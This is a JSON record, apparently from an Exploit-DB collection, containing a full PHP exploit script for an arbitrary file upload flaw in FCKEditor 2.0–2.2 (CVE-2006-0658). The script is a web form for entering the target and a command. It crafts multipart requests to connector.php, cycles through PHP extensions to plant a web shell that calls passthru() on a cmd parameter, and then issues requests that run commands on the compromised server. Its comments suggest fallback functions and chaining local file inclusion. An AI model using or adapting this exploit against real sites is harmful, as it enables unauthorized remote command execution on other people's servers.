{
  "id": "1484",
  "title": "FCKEditor 2.0 &lt; 2.2 - &#039;FileManager connector.php&#039; Arbitrary File Upload",
  "cve": "CVE-2006-0658",
  "vuln_type": "file_upload",
  "code": "<?php\r\n#  ---fckeditor_22_xpl.php                              15.38 04/12/2005       #\r\n#                                                                              #\r\n#                       FCKEditor 2.0 <= 2.2 shell upload                      #\r\n#                              coded by rgod                                   #\r\n#                     site: http://retrogod.altervista.org                     #\r\n#                                                                              #\r\n#  usage: launch from Apache, fill in requested fields, then go!               #\r\n#                                                                              #\r\n#  Sun-Tzu: \"Security against defeat implies defensive tactics; ability to     #\r\n#  defeat the enemy means taking the offensive\"                                #\r\n\r\n/* -> a short explaination: if a user cam call directly\r\n\r\n      http://[target]/[path]/editor/filemanager/browser/default/connectors/php/connector.php\r\n\r\n      he can upload malicious contempt on a target server, including arbitrary\r\n      php code, and launch commands on it\r\n\r\n      this works when php connector is enabled in config.php and when, ex.,\r\n      in Apache httpd.conf \"AddType application/x-httpd-php\" directive we have\r\n      an extension not specified in FCKEditor Config[DeniedExtensions][File]\r\n      array.\r\n\r\n      However, FCKeditor is integrated in a lot of applications, and if you\r\n      succeed to upload the shell (see details in the output of this script)\r\n      search for a local inclusion issue inside of them and include the uploaded\r\n      file                                                                    */\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\", 5);\r\nob_implicit_flush (1);\r\n\r\necho'<html><head><title> ******* FCKEditor 2.0 <= 2.2 shell upload**************\r\n</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<style type=\"text/css\"> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:\r\n#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img\r\n{background-color:   #FFFFFF   !important}  input  {background-color:    #303030\r\n!important} option {  background-color:   #303030   !important}         textarea\r\n{background-color: #303030 !important} input {color: #1CB081 !important}  option\r\n{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox\r\n{background-color: #303030 !important} select {font-weight: normal;       color:\r\n#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;\r\nbackground-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:\r\n0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em\r\n!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em\r\n!important} \th2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em\r\n!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:\r\nnormal !important} *{text-decoration: none !important} a:link,a:active,a:visited\r\n{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;\r\ncolor : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-weight:bold; font-style: italic;}--></style></head><body><p class=\"Stile6\">\r\n ******* FCKEditor 2.0 <= 2.2 shell upload************** </p><p class=\"Stile6\">a\r\nscript  by  rgod  at    <a href=\"http://retrogod.altervista.org\"target=\"_blank\">\r\nhttp://retrogod.altervista.org</a> </p> <table  width=\"84%\"><tr><td width=\"43%\">\r\n<form name=\"form1\" method=\"post\"   action=\"'.$_SERVER[PHP_SELF].'\">    <p><input\r\ntype=\"text\"  name=\"host\"> <span class=\"Stile5\">* target    (ex:www.sitename.com)\r\n</span></p> <p><input type=\"text\" name=\"path\">  <span class=\"Stile5\">* path (ex:\r\n/FCKEditor/ or just / ) </span></p><p><input type=\"text\" name=\"cmd\">       <span\r\nclass=\"Stile5\"> * specify a command</span></p><p><input type=\"text\" name=\"port\">\r\n<span class=\"Stile5\">specify  a  port other than  80 (default value)</span> </p>\r\n<p><input   type=\"text\" name=\"proxy\"><span class=\"Stile5\"> send  exploit through\r\nan HTTP proxy (ip:port) </span>  </p>  <p>  <input   type=\"submit\" name=\"Submit\"\r\nvalue=\"go!\"></p></form></td></tr></table></body></html>';\r\n\r\nfunction show($headeri)\r\n{\r\n  $ii=0;$ji=0;$ki=0;$ci=0;\r\n  echo '<table border=\"0\"><tr>';\r\n  while ($ii <= strlen($headeri)-1){\r\n    $dAtAi=dechex(ord($headeri[$ii]));\r\n    if ($ji==16) {\r\n      $ji=0;\r\n      $ci++;\r\n      echo \"<td>&nbsp;&nbsp;</td>\";\r\n      for ($li=0; $li<=15; $li++) {\r\n        echo \"<td>\".htmlentities($headeri[$li+$ki]).\"</td>\";\r\n\t\t}\r\n      $ki=$ki+16;\r\n      echo \"</tr><tr>\";\r\n    }\r\n    if (strlen($dAtAi)==1) {\r\n      echo \"<td>0\".htmlentities($dAtAi).\"</td>\";\r\n    }\r\n    else {\r\n      echo \"<td>\".htmlentities($dAtAi).\"</td> \";\r\n    }\r\n    $ii++;$ji++;\r\n  }\r\n  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {\r\n    echo \"<td>&nbsp&nbsp</td>\";\r\n  }\r\n  for ($li=$ci*16; $li<=strlen($headeri); $li++) {\r\n    echo \"<td>\".htmlentities($headeri[$li]).\"</td>\";\r\n  }\r\n  echo \"</tr></table>\";\r\n}\r\n\r\n$pRoXy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction sendpacket() //2x speed\r\n{\r\n  global $pRoXy, $host, $port, $pAcKeT, $HtMl, $pRoXy_regex;\r\n  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\r\n  if ($socket < 0) {\r\n    echo \"socket_create() failed: reason: \" . socket_strerror($socket) . \"<br>\";\r\n  }\r\n  else {\r\n    $c = preg_match($pRoXy_regex,$pRoXy);\r\n    if (!$c) {echo 'Not a valid prozy...';\r\n    die;\r\n    }\r\n  echo \"OK.<br>\";\r\n  echo \"Attempting to connect to \".$host.\" on port \".$port.\"...<br>\";\r\n  if ($pRoXy=='') {\r\n    $result = socket_connect($socket, $host, $port);\r\n  }\r\n  else {\r\n    $parts =explode(':',$pRoXy);\r\n    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n    $result = socket_connect($socket, $parts[0],$parts[1]);\r\n  }\r\n  if ($result < 0) {\r\n    echo \"socket_connect() failed.\\r\\nReason: (\".$result.\") \" . socket_strerror($result) . \"<br><br>\";\r\n  }\r\n  else {\r\n    echo \"OK.<br><br>\";\r\n    $HtMl= '';\r\n    socket_write($socket, $pAcKeT, strlen($pAcKeT));\r\n    echo \"Reading response:<br>\";\r\n    while ($out= socket_read($socket, 2048)) {$HtMl.=$out;}\r\n    echo nl2br(htmlentities($HtMl));\r\n    echo \"Closing socket...\";\r\n    socket_close($socket);\r\n  }\r\n  }\r\n}\r\n\r\nfunction sendpacketii($pAcKeT)\r\n{\r\n  global $pRoXy, $host, $port, $HtMl, $pRoXy_regex;\r\n  if ($pRoXy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.htmlentities($host); die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($pRoXy_regex,$pRoXy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$pRoXy);\r\n    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$pAcKeT);\r\n  if ($pRoXy=='') {\r\n    $HtMl='';\r\n    while (!feof($ock)) {\r\n      $HtMl.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $HtMl='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$HtMl))) {\r\n      $HtMl.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n  echo nl2br(htmlentities($HtMl));\r\n  }\r\n\r\n\r\nfunction refresh()\r\n{\r\n  flush();\r\n  ob_flush();\r\n  usleep(100000);\r\n}\r\nfunction make_seed()\r\n{\r\n   list($usec, $sec) = explode(' ', microtime());\r\n   return (float) $sec + ((float) $usec * 100000);\r\n}\r\n\r\n$host=$_POST[host];$port=$_POST[port];\r\n$path=$_POST[path];$cmd=$_POST[cmd];\r\n$pRoXy=$_POST[proxy];\r\necho \"<span class=\\\"Stile5\\\">\";\r\n\r\nif (($host<>'') and ($path<>'') and ($cmd<>''))\r\n{\r\n  $port=intval(trim($port));\r\n  if ($port=='') {$port=80;}\r\n  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\n  if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n  $host=str_replace(\"\\r\",\"\",$host);$host=str_replace(\"\\n\",\"\",$host);\r\n  $path=str_replace(\"\\r\",\"\",$path);$path=str_replace(\"\\n\",\"\",$path);\r\n\r\n  //modify the shell as you want, this could be written in any language\r\n  //if exploit succeeded we will see phpinfo() even, check for disable_functions\r\n  //if passthru() disabled, try with system(), exec(), popen() or shell_exec()\r\n  $SHELL =\"<?php echo chr(72).\\\"i Master!\\\";ini_set(\\\"max_execution_time\\\",0);error_reporting(0);\";\r\n  $SHELL.=\"phpinfo();passthru(\\$HTTP_GET_VARS[cmd]);?>\";\r\n  //we try to guess allowed extensions...\r\n  // you should succeed with .php3 for 2.0fc\r\n  //  \"     \"       \"     \"  .php  for 2.0rc1\r\n  //  \"     \"       \"     \"  .php  for 2.0rc2\r\n  //  \"     \"       \"     \"  .php3 for 2.0rc3\r\n  //  \"     \"       \"     \"  .pwml for 2.1 (added some restrictions, but maybe\r\n  //                                        this is executable on some machine)\r\n  //  \"     \"       \"     \"  .pwml for 2.11\r\n  //  \"     \"       \"     \"  .pwml for 2.2\r\n  $extensions= array('.php', '.php3', '.php5', '.phtml','.pwml', '.php4', '.php2', '.inc');\r\n  //add what you want\r\n  //'FileUpload' for versions 2.11 - 2.1 - 2.0rc3 - 2.0rc2 - 2.0rc1 - 2.0fc\r\n  //empty for 2.2\r\n  $upload_command= array('FileUpload','');\r\n  $path_to_shell=\"/UserFiles/File/\"; //default one: if different, script will find it\r\n\r\n  for ($x=0; $x<=count($extensions)-1; $x++)\r\n  {\r\n    for ($y=0; $y<=1; $y++)\r\n    {\r\n      # STEP 1 -> Upload the shell\r\n      srand(make_seed());\r\n      $anumber = rand(1,9999);\r\n      $filename=\"suntzu\".$anumber.$extensions[$x];\r\n      $dAtA=\"-----------------------------7d529a1d23092a\\r\\n\";\r\n      $dAtA.=\"Content-Disposition: form-data; name=\\\"NewFile\\\"; filename=\\\"$filename\\\"\\r\\n\";\r\n      $dAtA.=\"Content-Type:\\r\\n\\r\\n\";\r\n      $dAtA.=\"$SHELL\\r\\n\";\r\n      $dAtA.=\"-----------------------------7d529a1d23092a--\\r\\n\";\r\n      $pAcKeT=\"POST \".$path.\"editor/filemanager/browser/default/connectors/php/\";\r\n      $pAcKeT.=\"connector.php?Command=\".$upload_command[$y].\"&Type=File&CurrentFolder= HTTP/1.1\\r\\n\";\r\n      $pAcKeT.=\"Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\\r\\n\";\r\n      $pAcKeT.=\"User-Agent: Sun-tzu giving you the pain\\r\\n\";\r\n      $pAcKeT.=\"Host: \".$host.\"\\r\\n\";\r\n      $pAcKeT.=\"Content-Length: \".strlen($dAtA).\"\\r\\n\";\r\n      $pAcKeT.=\"Connection: Close\\r\\n\\r\\n\";\r\n      $pAcKeT.=$dAtA;\r\n      show($pAcKeT);\r\n      sendpacketii($pAcKeT);\r\n      if (!eregi(\"200 OK\",$HtMl)) {die(\"Cannot find connector.php...<br>\");}\r\n      if (eregi(\"This connector is disabled\",$HtMl)) {echo \"Exploit failed... -> php connector not enabled\";die;}\r\n      if (eregi(\"url=\\\"\",$HtMl))\r\n      {\r\n        $temp=explode(\"url=\\\"\",$HtMl);\r\n        $temp2=explode(\"\\\"\",$temp[1]);\r\n        $path_to_shell=$temp2[0];\r\n      }\r\n      echo \"<br>path where I search shell: \".htmlentities($path_to_shell).\"<br>\";\r\n      # STEP 2 -> Launch commands...\r\n      #by default a \"UserFiles/File/\" dir is generated inside site root when you upload\r\n      #files, this dir is not protected by an .htaccess file or whatever\r\n      $pAcKeT=\"GET \".$path_to_shell.$filename.\"?cmd=\".urlencode($cmd).\" HTTP/1.1\\r\\n\";\r\n      $pAcKeT.=\"User-Agent: GoogleBot/1.1\\r\\n\";\r\n      $pAcKeT.=\"Host: \".$host.\"\\r\\n\";\r\n      $pAcKeT.=\"Connection: Close\\r\\n\\r\\n\";\r\n      show($pAcKeT);\r\n      sendpacketii($pAcKeT);\r\n      if (eregi(\"200 OK\",$HtMl)) {\r\n                                 if (eregi(\"Hi Master!\",$HtMl))\r\n    \t\t\t         {echo \"Exploit succeeded...<br>\";\r\n\t\t\t\t  echo \"we have a shell in http://\".$host.$path_to_shell.$filename.\"<br>\";\r\n\t\t\t\t  echo \"we should have phpinfo() here, see html...<br>\";\r\n\t\t\t          die;}\r\n                                  else {echo \"Successfully uploades...<br>\r\n\t\t\t                      but is not an executable on target server...<br>\";}\r\n                               }\r\n      refresh();\r\n    }\r\n\r\n  }\r\n#if you are here...\r\necho \"Exploit failed...\";\r\n}\r\nelse\r\n{echo \"Fill * required fields, optionally specify a proxy...\";}\r\necho \"</span>\";\r\n?>\r\n\r\n# milw0rm.com [2006-02-09]",
  "url": "https://www.exploit-db.com/exploits/1484"
}